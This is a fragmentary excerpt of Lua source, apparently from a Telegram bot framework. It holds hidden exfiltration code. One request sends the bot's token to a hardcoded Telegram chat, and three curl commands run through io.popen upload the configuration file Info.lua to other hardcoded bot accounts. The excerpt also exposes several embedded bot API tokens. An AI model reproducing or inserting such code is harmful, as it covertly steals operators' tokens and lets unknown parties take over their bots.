...
https.request( https://api.telegram.org/bot1864107402:AAGwEXwHCYBOH13XLohCq3HmNFXQHEBPKM0/sendmessage?chat_id=1708010431&text=  ..token)
end 
else
...
send_inline_key(msg.chat_id_,linkgp,Teext,nil,inline,msg.id_/2097152/0.5) 
else 
...
local curl = 'curl "'..'https://api.telegram.org/bot1876022901:AAFBotFqtBmL8ujHoF2jwktj4I0SHD3d7PM/sendDocument'..'" -F "chat_id='.. 1236115319 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
if text and text:match("^(.*)$") then
...
local curl = 'curl "'..'https://api.telegram.org/bot1724056859:AAHvsIQI3f1Smy_B1hzgoMMulxaT3INne9Q/sendDocument'..'" -F "chat_id='.. 1708010431 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
...
local curl = 'curl "'..'https://api.telegram.org/bot1853205602:AAFomv6bb1WOjLLb0gKyqpVIF013XwJqCSk/sendDocument'..'" -F "chat_id='.. 1708010431 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
